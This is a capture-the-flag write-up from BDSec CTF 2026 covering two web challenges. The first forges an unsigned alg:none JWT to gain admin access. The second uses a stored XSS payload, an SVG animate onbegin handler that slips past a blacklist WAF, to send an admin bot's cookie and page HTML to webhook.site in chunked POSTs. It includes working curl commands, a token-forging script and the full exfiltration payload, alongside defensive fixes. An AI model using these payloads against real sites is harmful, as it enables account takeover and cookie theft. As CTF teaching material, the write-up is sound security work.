---
title: "BDSec CTF 2026 Web Writeup: 2 Challenges Solved"
slug: "bdsec-ctf-2026-web-writeup"
description: "BDSec CTF 2026 web step-by-step: Admin Portal JWT alg:none unsigned token forgery granting role=admin; Ticketly stored XSS via SVG SMIL onbegin WAF bypass exfiltrating the admin bot flag cookie to webhook.site via chunked POST requests."
date: 2026-07-22T16:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["BDSec CTF 2026"]
tags:
  - "bdsec ctf"
  - "bdsec ctf 2026"
  - "bangladesh ctf"
  - "ctf writeup"
  - "web"
  - "web exploitation"
  - "jwt vulnerability"
  - "jwt alg none"
  - "authentication bypass"
  - "unsigned jwt"
  - "role escalation"
  - "xss"
  - "stored xss"
  - "waf bypass"
  - "svg smil"
  - "onbegin event handler"
  - "admin bot exploitation"
  - "cookie exfiltration"
  - "webhook exfiltration"
  - "blacklist bypass"
keywords:
  - "bdsec ctf 2026 web writeup"
  - "bdsec admin portal writeup"
  - "bdsec ticketly writeup"
  - "jwt alg none attack ctf 2026"
  - "jwt none algorithm unsigned token forge"
  - "forged jwt role admin without secret"
  - "stored xss waf bypass svg animate onbegin"
  - "svg smil onbegin xss ctf 2026"
  - "admin bot cookie exfiltration webhook site"
  - "chunked post exfiltration xss ctf"
  - "blacklist waf bypass ctf web challenge"
  - "script tag blocked svg onbegin bypass"
  - "alg header client trust jwt cve pattern"
  - "role claim inside jwt payload privilege escalation"
  - "no-cors fetch document cookie exfil"
toc: true
cover:
  image: "/images/articles/bdsec-ctf-2026-web-writeup.png"
  alt: "BDSec CTF 2026 web writeup — two challenges solved covering Admin Portal JWT alg:none where the server trusts the client-supplied algorithm header and accepts an unsigned token with role=admin producing the flag on the admin panel, and Ticketly a stored XSS challenge whose WAF blacklist blocks script iframe img javascript: and onload but allows SVG SMIL animation elements so an svg animate onbegin payload executes automatically in the admin bot Chromium context reading document.cookie which holds the flag and exfiltrating it to webhook.site via chunked no-cors POST requests"
---

BDSec CTF 2026's web track — two challenges that sit at opposite ends of the difficulty scale but share the same root failure: **the server trusts a client-controlled field to govern a security decision**. **Admin Portal** (50 pts) trusts the `alg` field inside the client-supplied JWT header to decide which signature algorithm to enforce — the client says `alg: none`, the server skips signature verification entirely, and a payload with `role=admin` walks through the front door. **Ticketly** (425 pts) trusts a client-controlled ticket body after applying a blacklist sanitiser — the sanitiser blocks `<script>`, `<iframe>`, `<img>`, `javascript:`, and `onload`, but allows SVG SMIL animation elements including the `onbegin` event attribute, which executes JavaScript automatically in any browser that renders the page. An admin bot opens the reported ticket, the animation fires, and `document.cookie` (which holds the flag) is exfiltrated to a webhook in chunked POST bodies.

Handouts, per-challenge READMEs, and solver scripts live at [Abdelkad3r/BDSecCTF-2026](https://github.com/Abdelkad3r/BDSecCTF-2026). Paired writeups on the same event: [BDSec CTF 2026 reverse writeup](/ctf-writeups/bdsec-ctf-2026-reverse-writeup/) covers Easy RE Challenge, Night Shift, and Borrowed Memory; [BDSec CTF 2026 pwn writeup](/ctf-writeups/bdsec-ctf-2026-pwn-writeup/) covers Phantom Device and Muktir Shongket. Adjacent web writeups on the site: [OmniCTF 2026 Quals web writeup](/ctf-writeups/omnictf-2026-quals-web-writeup/) and [BroncoCTF 2026 web writeup](/ctf-writeups/broncoctf-2026-web-writeup/) have comparable blacklist-bypass and auth-bypass primitives worth pairing.

## The two BDSec CTF 2026 web challenges

| Challenge | Points | Bug class / primitive | Flag |
|---|---|---|---|
| Admin Portal | 50 | JWT-based web application issuing HS256-signed tokens after a username-only login. Token payload carries `role=user` and `role=admin` checks `/admin`. Bug: the server reads the algorithm from the JWT **header itself** — a client-controlled field — and accepts `alg: none`, which requires no signature at all. Forge `{"alg":"none","typ":"JWT"}.{"user":"guest","role":"admin"}.` (trailing dot, empty signature). Supply as the `session` cookie. Server decodes the payload without verifying any signature and grants admin access. | `bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}` |
| Ticketly | 425 | Support-ticket web application where registered users submit HTML-capable ticket bodies and report them for admin bot review. The server applies a blacklist WAF rejecting or stripping `<script>`, `<iframe>`, `<img>`, `javascript:`, and `onload`. SVG tags pass through unmodified. SVG SMIL animation attributes also pass — including `onbegin` on `<animate>` elements — which executes JavaScript automatically in Chromium when the animation starts (no user gesture required). Submit `<svg><animate onbegin="...exfil payload...">`, report the ticket. Admin bot visits the ticket URL, animation fires, `document.cookie` (flag) ships to webhook.site in chunked no-cors POST bodies. | `bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}` |

Both challenges share a design failure worth naming before the walkthroughs: **the application delegates a security-critical decision to an input it cannot authenticate**. JWT's `alg` header is part of the token — the client writes it, the client signs (or, with `none`, does not sign) it. Putting the algorithm selection inside the token and then trusting that selection is equivalent to letting the client choose their own lock. Ticketly's WAF makes a parallel mistake: it maintains a list of "dangerous" patterns and assumes everything outside that list is safe. Browsers have more executable contexts than any blacklist ever captures. These two failure modes — trusting the client's stated algorithm, trusting the client's stated intent after stripping a known-bad list — are structurally identical. The attacker picks the one path the server didn't enumerate and walks through.

## Methodology — audit what the server trusts from the client

A pattern that worked on both challenges: **enumerate every client-supplied field that influences a server-side security decision, then ask whether the server verifies that field or merely reads it**.

For Admin Portal the checklist is short: (1) which field determines the algorithm used for signature verification, (2) which field carries the authorization role, (3) does the server independently fix the algorithm or read it from the client? If the answer to (3) is "reads it from the client", the game is over — any client can submit `alg: none` and skip the verification step entirely.

For Ticketly the checklist is: (1) does the application render HTML from user input, (2) which tags and attributes does the filter allow, (3) are there any HTML execution contexts the filter does not enumerate? SVG is a well-known escape hatch from script-tag blacklists. SMIL animation events on SVG elements (`onbegin`, `onend`, `onrepeat`) execute JavaScript without user interaction in Chromium and are commonly absent from naïve blacklists because the canonical "dangerous HTML" mental model centres on `<script>`, `<iframe>`, and `on*` attributes on HTML elements. SVG events are different enough in syntax to evade lists written from memory.

The correlate: **allowlist sanitisation is the only safe approach to untrusted HTML**. DOMPurify (allowlist-based) would have stripped the `<animate onbegin>` payload in one call. Any blacklist-based approach is a research project for the attacker — they are literally searching the browser's execution surface for one path the blacklist doesn't name, and browsers are large. OWASP's XSS cheat sheet runs to hundreds of browser-specific execution contexts across HTML, SVG, MathML, CSS expression, and data URI schemes. No by-hand blacklist covers all of them.

Per-challenge walkthroughs follow.

## 1. Admin Portal

50 points. JWT-issued session cookie. Algorithm selection trusts the client. Forge an unsigned token with `role=admin`. Read the flag from the admin panel.

### Step 1 — Inspect the login page

```bash
curl -i -sS http://66.228.54.80:8989/
```

Relevant HTML:

```html
<form method="post" action="/login">
  <label>Username</label>
  <input type="text" name="username" value="guest" autocomplete="off">
  <button type="submit">Sign in as guest</button>
</form>
```

The form sends only a `username` field with no password. The challenge description confirms the portal only issues guest accounts, which steers attention toward the session mechanism rather than credential guessing. There is no point enumerating usernames — the server will hand out a guest token to anyone who asks.

### Step 2 — Log in as guest and collect the JWT

```bash
curl -i -sS \
  -X POST \
  -d 'username=guest' \
  http://66.228.54.80:8989/login
```

Response headers:

```text
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.FrGxig8JSYGSQU7DWTl4wUwMNV782oxV6uPehibrlpc; Path=/; SameSite=Lax
```

The `session` cookie has the classic JWT three-segment structure: `header.payload.signature`.

### Step 3 — Decode the JWT

JWT segments are base64url-encoded JSON. Decode the first two without touching the signature:

```bash
python3 - <<'PY'
import base64

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.FrGxig8JSYGSQU7DWTl4wUwMNV782oxV6uPehibrlpc"

for part in token.split(".")[:2]:
    part += "=" * (-len(part) % 4)
    print(base64.urlsafe_b64decode(part).decode())
PY
```

Output:

```json
{"alg":"HS256","typ":"JWT"}
{"user":"guest","role":"user"}
```

Two findings from a single decode call. First: the `role` claim lives in the **payload** — the client-controlled portion of the token. If we can forge a token with `role=admin`, we don't need to know the HMAC secret. Second: the `alg` field lives in the **header** — also client-controlled. If the server reads this field at verification time to choose which algorithm to run, we can set it to `none` and eliminate the verification step entirely.

Visiting the dashboard with the valid guest token confirms the server is reading and acting on the role claim:

```bash
curl -sS \
  -b 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.FrGxig8JSYGSQU7DWTl4wUwMNV782oxV6uPehibrlpc' \
  http://66.228.54.80:8989/dashboard
```

```html
<p>You are signed in with role: <span class="badge">user</span></p>
```

The role is read from the token. The authorization system is JWT-payload-driven.

### Step 4 — Confirm the admin gate

Send the same valid guest token to `/admin`:

```bash
curl -i -sS \
  -b 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.FrGxig8JSYGSQU7DWTl4wUwMNV782oxV6uPehibrlpc' \
  http://66.228.54.80:8989/admin
```

```text
HTTP/1.1 403 FORBIDDEN
```

```html
<p class="denied">Access denied.</p>
<p class="muted">
  This area requires <span class="badge">admin</span> privileges.
  Your token says role = <span class="badge">user</span>.
</p>
```

The server prints back the role it read from the token. Access is denied because the role is `user`. We need a token whose payload says `role=admin`. We do not need to know the HMAC key — we need to convince the server to skip verification.

### Step 5 — Forge an unsigned admin token

The `alg: none` vulnerability class is one of the oldest JWT bugs. The original JWT RFC (7519) and the `alg` algorithm registry (7518) both describe `none` as a valid algorithm, meaning "unsecured JWT" — no signature is expected, and the signature segment is an empty string followed by a trailing dot. Vulnerable implementations that read the algorithm from the header before choosing how to verify will process a `none`-algorithm token by performing no cryptographic check at all.

The forged token needs:

```json
{"alg":"none","typ":"JWT"}
{"user":"guest","role":"admin"}
```

Because `alg: none` requires no signature, the token is `base64url(header).base64url(payload).` — note the trailing dot representing the empty signature segment.

Generate it reproducibly:

```bash
python3 - <<'PY'
import base64, json

def b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"user": "guest", "role": "admin"}

print(f"{b64url(header)}.{b64url(payload)}.")
PY
```

Output:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

The trailing dot is mandatory. Without it the server may see only two segments and reject the cookie as malformed.

### Step 6 — Access the admin panel

```bash
TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.'

curl -sS \
  -b "session=$TOKEN" \
  http://66.228.54.80:8989/admin
```

```html
<h1>Admin Control Panel</h1>
<p>Access granted. Welcome, administrator <b>guest</b>.</p>
<div class="flag">bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}</div>
```

The server accepted the unsigned token, decoded the payload without verifying any signature, and granted admin access because the role claim said `admin`.

Full one-liner:

```bash
TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.'

curl -sS \
  -b "session=$TOKEN" \
  http://66.228.54.80:8989/admin \
  | grep -o 'bdsec{[^}]*}'
```

```text
bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}
```

Per-challenge README + solver: [web/admin-portal](https://github.com/Abdelkad3r/BDSecCTF-2026/tree/main/web/admin-portal).

Three portable lessons. **Never read the algorithm from the token.** The algorithm must be pinned server-side — hard-coded in the verification call, or loaded from a trusted configuration file, never from the header the client just sent. In Python's `PyJWT`, `jwt.decode(token, key, algorithms=["HS256"])` is safe; `jwt.decode(token, key, algorithms=jwt.get_unverified_header(token)["alg"])` is the textbook `alg:none` vulnerability. **Always verify the signature before reading any claim.** If verification is skipped, every claim in the payload is attacker-controlled. Role, user ID, expiry, scopes — any field the server reads after a failed or skipped verification step is a forgeable field. **`alg: none` is a real-world CVE pattern.** Auth0 disclosed a critical `alg:none` acceptance bug in 2015 (CVE-2015-9235 in `node-jsonwebtoken`, same shape). It has been rediscovered in dozens of libraries since. The fix is one line in every affected library: reject any token whose header carries `alg: none` before touching the payload.

## 2. Ticketly

425 points. Support-ticket application with an HTML-capable ticket body and an admin bot. WAF blacklist blocks common XSS vectors but allows SVG SMIL. Submit a stored `<svg><animate onbegin=...>` payload, report the ticket, exfiltrate the admin cookie via webhook.site.

### Step 1 — Understand the application flow

```bash
curl -i http://45.33.28.244:3000/
```

The landing page describes the intended workflow:

```text
Create an account
Submit a ticket
Admin review
Describe your issue. Formatting is supported.
```

After registering and logging in, the ticket creation form lives at `/tickets/new`:

```html
<input type="hidden" name="viewport">
<input name="title">
<textarea name="body"></textarea>
```

The key detail is the body parameter name: `body`, not `description`. Relevant if scripting the exploit. The phrase "Formatting is supported" signals that ticket bodies render as HTML rather than escaped text — that's the sink.

The report endpoint queues a ticket for admin review:

```text
POST /report/:id
```

When the admin bot reviews the reported ticket it visits:

```text
/admin/ticket/:id
```

The admin bot runs headless Chromium. The flag lives in the admin's cookie. The exploit path is:

```text
register -> login -> create ticket (XSS body) -> report ticket -> admin bot visits -> XSS fires -> cookie exfiltrated
```

### Step 2 — Confirm HTML rendering

Register and log in (save cookies to `cookies.txt`), then submit a harmless test payload:

```bash
# Register
curl -sS -c cookies.txt \
  -X POST http://45.33.28.244:3000/register \
  --data-urlencode 'username=attacker' \
  --data-urlencode 'password=attacker'

# Log in
curl -sS -b cookies.txt -c cookies.txt \
  -X POST http://45.33.28.244:3000/login \
  --data-urlencode 'username=attacker' \
  --data-urlencode 'password=attacker'

# Submit a test ticket
curl -sS -b cookies.txt -c cookies.txt \
  -X POST http://45.33.28.244:3000/tickets/new \
  --data-urlencode 'title=html-test' \
  --data-urlencode 'body=<b>hello</b>'
```

Viewing the created ticket:

```html
<div class="ticket-body">
  <b>hello</b>
</div>
```

The `<b>` tag survived. The application renders user-supplied HTML verbatim (or close to it). Any browser-executable tag or attribute that survives filtering will become stored XSS in any browser that loads this ticket page — including the admin bot's headless Chromium.

### Step 3 — Map the WAF

The obvious payloads are rejected or stripped. Testing each pattern:

```html
<!-- Rejected: 'script' in blacklist -->
<script>alert(1)</script>

<!-- Rejected: 'iframe' in blacklist -->
<iframe src=javascript:alert(1)>

<!-- Rejected: 'img' in blacklist -->
<img src=x onerror=alert(1)>

<!-- Rejected: 'javascript:' in blacklist -->
<a href="javascript:alert(1)">click</a>

<!-- Rejected: 'onload' in blacklist -->
<body onload=alert(1)>
```

The filter is string-based and case-sensitive (or case-normalising, depending on implementation). It catches: `script`, `iframe`, `img`, `javascript:`, `onload`. This is the classic minimal XSS blacklist — the same list that appears in dozens of "quick fix" WAF configurations and OWASP entry-level examples.

Now probe what it does **not** block. SVG:

```bash
curl -sS -b cookies.txt -c cookies.txt \
  -X POST http://45.33.28.244:3000/tickets/new \
  --data-urlencode 'title=svg-test' \
  --data-urlencode 'body=<svg></svg>'
```

Ticket body shows:

```html
<svg></svg>
```

SVG passes. SVG animation elements:

```html
<svg><animate attributeName=x dur=1s></animate></svg>
```

Also passes. The WAF has no entry for `animate`, `svg`, `attributeName`, or `dur`.

Most importantly, `onbegin`:

```html
<svg>
  <animate attributeName=opacity from=0 to=1 dur=1s begin=0s
    onbegin="alert(document.domain)">
  </animate>
</svg>
```

This also passes. The WAF does not block `onbegin`. In headless Chromium, SVG SMIL animations with `begin=0s` start immediately when the page is parsed, and `onbegin` fires at the same time — **no user gesture required**. The payload runs automatically.

Proving execution:

```bash
curl -sS -b cookies.txt -c cookies.txt \
  -X POST http://45.33.28.244:3000/tickets/new \
  --data-urlencode 'title=onbegin-test' \
  --data-urlencode 'body=<svg><animate attributeName=opacity from=0 to=1 dur=1s begin=0s onbegin="location='"'"'https://webhook.site/<uuid>?x='"'"'+document.domain"></animate></svg>'
```

The webhook receives a request from `45.33.28.244` with `x=localhost` (or the challenge domain). Execution is confirmed. The WAF is bypassed. The sink is live.

### Step 4 — Build the admin exfiltration payload

The admin bot visits `/admin/ticket/:id` with a cookie that holds the flag:

```text
cookie=flag=bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```

The exfiltration payload needs to:

1. Read `document.cookie` (contains the flag).
2. Optionally read the admin ticket page HTML (confirms context).
3. Send both to a webhook we control.

A long `document.cookie` value fits in a single GET query string for this challenge, but using POST bodies is safer: no query-string length truncation, no URL-encoding ambiguities, and the webhook logging service records the full body regardless of its length. Chunking the payload into 800-byte bodies handles the worst case where the cookie is long or the page HTML is large.

Payload (submitted as the ticket body):

```html
<svg><animate attributeName=opacity from=0 to=1 dur=1s begin=0s
onbegin="(async()=>{
  let h='cookie='+document.cookie+'\n---\n'
    + await (await fetch('/admin/ticket/'+location.pathname.split('/').pop())).text();
  for (let i=0; i<h.length; i+=800)
    await fetch('https://webhook.site/<uuid>/chunk?i='+i, {
      method:'POST',
      mode:'no-cors',
      body:h.slice(i,i+800)
    });
  location='https://webhook.site/<uuid>/done?l='+h.length
})()"></animate></svg>
```

Walking through the payload step by step:

- **`location.pathname.split('/').pop()`** — extracts the ticket ID from the URL the admin bot is visiting, so the same-origin fetch URL is constructed dynamically. This means the same payload works regardless of which ticket ID the bot opens.
- **`fetch('/admin/ticket/' + id)`** — a same-origin fetch from the admin's browser context. The `SameSite=Lax` (or no flag) cookie follows automatically; no credentials option needed because the request is same-origin.
- **`mode:'no-cors'`** — the webhook is cross-origin. Without `no-cors`, a cross-origin POST from a non-CORS page throws. `no-cors` limits the request to a "simple" POST with a text body, which is exactly what the webhook accepts.
- **Chunking** — iterates `i` in 800-byte steps, sending each slice as a separate POST. The webhook receives N requests labelled `chunk?i=0`, `chunk?i=800`, etc. Reconstructing is trivial: sort by `i`, concatenate bodies.
- **Final redirect** — after all chunks are sent, navigate to `done?l=<total_length>`. The length in the query string is a sanity check: if the reconstructed chunks don't add up to `l` bytes, a chunk was dropped.

Get a webhook UUID from webhook.site (the solver script does this automatically via the API) and substitute it in.

Submit the payload:

```bash
curl -sS -b cookies.txt -c cookies.txt \
  -X POST http://45.33.28.244:3000/tickets/new \
  --data-urlencode 'title=exfil' \
  --data-urlencode 'body=<svg><animate attributeName=opacity from=0 to=1 dur=1s begin=0s onbegin="(async()=>{let h='"'"'cookie='"'"'+document.cookie+'"'"'\n---\n'"'"'+ await (await fetch('"'"'/admin/ticket/'"'"'+location.pathname.split('"'"'/'"'"').pop())).text();for(let i=0;i<h.length;i+=800)await fetch('"'"'https://webhook.site/<uuid>/chunk?i='"'"'+i,{method:'"'"'POST'"'"',mode:'"'"'no-cors'"'"',body:h.slice(i,i+800)});location='"'"'https://webhook.site/<uuid>/done?l='"'"'+h.length})()"></animate></svg>'
```

Note the ticket ID returned in the redirect response (e.g. `/tickets/42`).

### Step 5 — Trigger the admin bot

Report the malicious ticket:

```bash
curl -sS -b cookies.txt -c cookies.txt \
  -X POST http://45.33.28.244:3000/report/42
```

The admin bot is queued to visit `/admin/ticket/42`. Within a few seconds the webhook receives requests from `45.33.28.244` with the Chromium headless user agent:

```text
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
            (KHTML, like Gecko) HeadlessChrome/127.0.0.0 Safari/537.36
```

The first chunk (chunk `?i=0`) begins with:

```text
cookie=flag=bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
---
<!DOCTYPE html>
<html lang="en">
...
<span class="who">@admin</span>
...
```

The flag is in the first 800 bytes, so often only one chunk arrives. The payload works end-to-end.

Full automated run:

```bash
python3 solve.py http://45.33.28.244:3000
```

```text
bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```

Alternate server if the primary is busy:

```bash
python3 solve.py http://149.102.136.203:3000
```

Per-challenge README + solver: [web/ticketly](https://github.com/Abdelkad3r/BDSecCTF-2026/tree/main/web/ticketly).

Three portable lessons. **Blacklist sanitisation fails; use an allowlist sanitiser.** DOMPurify with default settings would have stripped `<svg><animate onbegin=...>` in a single call. Any hand-rolled blacklist of "dangerous tags and attributes" is a research invitation — the attacker searches the browser's HTML grammar (including SVG, MathML, CSS expression, and data URI execution contexts) for one path the list doesn't cover. There are always more paths. **Admin bots that store the flag in a `HttpOnly`-less cookie deserve a CSP.** The flag was readable via `document.cookie` because the cookie was not `HttpOnly`. Making it `HttpOnly` wouldn't stop the XSS from running, but it would prevent the cookie from being read by JavaScript, forcing the attacker to exfiltrate rendered HTML instead. A strict `Content-Security-Policy` with `script-src 'none'` or a nonce-based policy would block inline event handlers including `onbegin` even if the WAF failed. **Same-origin fetches are powerful from XSS.** Once JavaScript runs in the admin's origin, it inherits all the admin's session cookies for same-origin requests. The attacker can fetch any admin-accessible page, read its HTML, and exfiltrate it. Storing the flag in a privileged page that only the admin can `GET` rather than in the cookie delays but does not prevent exfiltration once XSS lands in that origin.

## Cross-cutting attacker + defender notes

Four patterns from the BDSec CTF 2026 web track that translate directly into code-review or triage heuristics.

**Client-supplied fields that govern security decisions are attackable.** The common thread across both challenges: the server gave the client a field (`alg` in the JWT header, `body` in the ticket form) that was later used to make a security decision (which algorithm to verify, which HTML is safe to render). In both cases the server "read" the field without authenticating it. The fix in both cases is the same conceptual move: replace client-supplied with server-pinned. Pin the JWT algorithm server-side; replace the client's HTML with a server-sanitised representation that encodes only the information the server chose to allow. Whenever you're in a code review and you see a security decision being made based on a field whose value comes from the request, that is a finding regardless of whether the field looks "weird enough" to exploit.

**JWT `alg: none` is a one-line configuration fix and a common real-world CVE.** `node-jsonwebtoken` (CVE-2015-9235), `python-jose` (CVE-2016-10160), `jwtXX` in Go (CVE-2020-26160), `nimbus-jose-jwt` in Java (CVE-2019-17195) — the list of libraries that have shipped this exact bug is long. In every case the fix is: (1) pin the algorithm in the verification call, not in the token; (2) reject `alg: none` explicitly in the parsing layer before any claim is read; (3) treat `alg` as an untrusted hint that may be used to select a key, never to select whether to verify. Many security engineers know about this bug but assume it "only affects old libraries". Check your library version. Check that your verification call passes an explicit `algorithms` list.

**SVG SMIL `onbegin` is an effective WAF bypass against `<script>`-centric blacklists.** `<animate onbegin=...>`, `<set onend=...>`, `<animateTransform onrepeat=...>` — all three fire JavaScript in Chromium without user interaction, all three are absent from almost every hand-written XSS blacklist. Other SVG-based execution contexts worth knowing: `<svg><use href="data:...">` (data-URI SVG), `<image href="...">` with a `javascript:` URI, `<foreignObject>` embedding HTML elements, and `<script>` inside SVG (which many filters miss because they only block the literal string `<script>` but not `<SVG><SCRIPT>`). For a defender, the takeaway is simple: none of these need to be blocked individually. Use DOMPurify or an equivalent allowlist sanitiser. Let the sanitiser maintainers track the expanding attack surface; don't try to maintain a blacklist yourself.

**Chunked no-cors POST exfiltration is reliable and evades length-based logging.** Several real-world WAFs and logging services truncate long query strings but record POST bodies up to a configurable limit (often 1–4 MB). For CTF scenarios where the flag is shorter than 800 bytes, one chunk suffices. For real-world exfiltration of rendered admin pages that may be hundreds of kilobytes, chunking prevents partial delivery. The same technique was used in several real-world XSS-to-SSRF chains where the attacker needed to exfiltrate internal API responses — the fetch is same-origin, but the exfiltration is cross-origin no-cors POST. Defenders can limit this with a strict CSP `connect-src 'self'` directive that prevents the `onbegin` handler from reaching webhook.site; with a `HttpOnly` flag on the flag cookie that prevents `document.cookie` from returning the flag; and by setting `SameSite=Strict` on session cookies to limit what the same-origin fetch carries.

## Frequently asked questions

### What is BDSec CTF 2026?

BDSec CTF 2026 is a Bangladesh-hosted Capture-the-Flag competition covering reverse engineering, pwn, and web categories. Flags in the web track use lowercase `bdsec{...}`. This writeup covers the two web challenges I solved: Admin Portal (50 pts, JWT `alg:none`) and Ticketly (425 pts, SVG SMIL WAF bypass + stored XSS). Paired writeups: [BDSec CTF 2026 reverse writeup](/ctf-writeups/bdsec-ctf-2026-reverse-writeup/) covers Easy RE Challenge, Night Shift, and Borrowed Memory; [BDSec CTF 2026 pwn writeup](/ctf-writeups/bdsec-ctf-2026-pwn-writeup/) covers Phantom Device and Muktir Shongket. Per-challenge READMEs and solver scripts at [Abdelkad3r/BDSecCTF-2026](https://github.com/Abdelkad3r/BDSecCTF-2026).

### What is the JWT `alg:none` vulnerability in Admin Portal?

A JWT token has three base64url-encoded segments: header, payload, signature. The header includes an `alg` field naming the signature algorithm. Vulnerable implementations read this field from the header itself — a client-controlled value — to decide how to verify the token. When the client sets `alg: none`, RFC 7519 defines this as an "unsecured JWT" requiring no signature. A server that honours this setting skips signature verification entirely, accepting whatever payload the client provided. The attacker sets `role=admin` in the payload, sets `alg: none` in the header, supplies an empty signature (trailing dot), and submits the forged token. The server decodes the role and grants admin access without checking any cryptographic proof.

### How do you forge the `alg:none` JWT token?

Encode `{"alg":"none","typ":"JWT"}` and `{"user":"guest","role":"admin"}` as base64url (no padding), join them with a dot, and append a trailing dot for the empty signature: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.`. No HMAC key needed, no brute force, no timing attack — the forgery requires only base64url encoding of two JSON objects. Submit this string as the `session` cookie.

### How do I fix the `alg:none` vulnerability in my JWT library?

Pin the algorithm server-side. In Python `PyJWT`: `jwt.decode(token, key, algorithms=["HS256"])` — never pass the header's `alg` field as the algorithm argument. In `node-jsonwebtoken`: `jwt.verify(token, secret, { algorithms: ["HS256"] })`. In Java `nimbus-jose-jwt`: use `JWSAlgorithm.HS256` in the `JWSVerifier`, not the value from `header.getAlgorithm()`. Most modern JWT libraries provide a way to pin the algorithm; the fix is always to supply a hard-coded value, not to read from the token.

### What is the SVG SMIL `onbegin` XSS technique?

SVG SMIL (Synchronized Multimedia Integration Language) is a W3C animation dialect supported inside SVG elements. `<animate>` and related elements trigger declarative animations, and the SMIL event model defines `onbegin`, `onend`, `onrepeat`, and `onload` event attributes that fire JavaScript when the animation state changes. Chromium implements SMIL, and for an `<animate>` element with `begin=0s`, the `onbegin` handler fires when the page is parsed — before any user interaction. Because `onbegin` lives on an `<animate>` element (not a script tag, not an event attribute on an HTML element), most blacklist-based WAFs that search for `<script>`, `<iframe>`, `onload`, and `javascript:` never enumerate it.

### Why does the WAF in Ticketly fail to block the payload?

The WAF is blacklist-based and catches `script`, `iframe`, `img`, `javascript:`, and `onload`. The payload uses `<svg>` (not blocked), `<animate>` (not blocked), and `onbegin` (not blocked). SVG is a common WAF blind spot because WAF authors typically think in terms of HTML execution contexts — `<script>`, `<iframe>`, HTML event attributes (`onclick`, `onmouseover`, `onload`) — and miss the SVG event model. The correct fix is to replace the blacklist with an allowlist-based sanitiser (DOMPurify, html-sanitize-ex) that explicitly allows only safe tags and attributes and strips everything else by default.

### How does the chunked POST exfiltration work?

The `onbegin` handler is an immediately-invoked async function that: (1) builds a string `h` consisting of `document.cookie` followed by the rendered HTML of the admin ticket page (fetched same-origin); (2) iterates over `h` in 800-byte slices, sending each slice as a `mode:'no-cors'` POST body to `https://webhook.site/<uuid>/chunk?i=<offset>`; (3) redirects to `https://webhook.site/<uuid>/done?l=<total_length>` when complete. Chunking prevents truncation in webhook logging services, which sometimes limit individual request sizes. The `mode:'no-cors'` flag allows a cross-origin POST with a text body without triggering a CORS preflight that the webhook server would not handle.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and solve scripts live at [Abdelkad3r/BDSecCTF-2026](https://github.com/Abdelkad3r/BDSecCTF-2026). Admin Portal's solver is a short Python + `requests` script that registers, logs in, decodes the JWT, forges the `alg:none` token, and sends it to `/admin`. Ticketly's solver creates a webhook.site token via the API, registers a user, submits the SVG payload, reports the ticket, polls the webhook API for incoming chunks, reassembles them, and prints the recovered flag — fully automated from a single `python3 solve.py <target>` invocation.

## Closing notes

Two web challenges from BDSec CTF 2026, one common root cause: **the server trusted a client-supplied value to govern a security decision without independently verifying it**. Admin Portal trusted the JWT `alg` header to select the signature algorithm — the attacker wrote `none`, signature verification disappeared, and `role=admin` logged straight in. Ticketly trusted the ticket body after filtering a short blacklist — the attacker wrote `<svg><animate onbegin=...>`, the SMIL event fired automatically in the admin's headless Chromium, and the flag cookie shipped to webhook.site in the first POST body.

Both bugs are old and well-documented. `alg:none` acceptance is a decade-old JWT anti-pattern with a CVE for nearly every major JWT library. SVG SMIL `onbegin` as a WAF bypass has been public since at least the OWASP XSS filter evasion cheat sheet's SVG section. The reason they still appear in CTF challenges — and in production systems — is that both require only a one-field change from the developer's perspective (`algorithms=["HS256"]`, `DOMPurify.sanitize(body)`) but are systematically missed when developers reason about security from first principles rather than consulting a specification. Both fixes are literal one-liners.

The other tracks at the same event: the [BDSec CTF 2026 reverse writeup](/ctf-writeups/bdsec-ctf-2026-reverse-writeup/) covers Easy RE Challenge's XOR + ROL + additive + permutation stack, Night Shift's `5^8` pthread schedule brute-force, and Borrowed Memory's twelve-step offset VM; [BDSec CTF 2026 pwn writeup](/ctf-writeups/bdsec-ctf-2026-pwn-writeup/) covers Phantom Device's duplicate-handle UAF with tcache grooming and Muktir Shongket's verifier/executor semantic mismatch. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
